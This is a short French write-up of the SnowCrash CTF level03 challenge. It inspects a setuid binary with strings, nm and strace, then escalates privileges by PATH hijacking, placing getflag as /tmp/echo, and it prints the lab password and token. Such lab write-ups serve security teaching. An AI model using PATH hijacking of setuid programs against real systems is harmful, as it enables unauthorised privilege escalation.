# LEVEL03

**LOGIN: level03**

**PASSWORD: kooda2puivaav1idi4f57q8iq**

----

Cette fois on a un binaire et un setuid: 
```
level03@SnowCrash:~$ ls -l ; echo ;  file level03

-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

De `strings level03`  on sort cette ligne d'intéressent : `/usr/bin/env echo Exploit me`

De `nm level03` : ` U system@@GLIBC_2.0`

De `strace -f -s 1000 ./level03`:   `execve("/usr/bin/env", ["/usr/bin/env", "echo", "Exploit", "me"], [/* 18 vars */]) `



Du coup suffit de changer le path, et le nom du binaire qu'on veut faire exec avec les droits suid : 

```
cp  /bin/getflag /tmp/echo
PATH=/tmp ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
``` 

**TOKEN = qi0maab88jeaj46qoumi7maus**
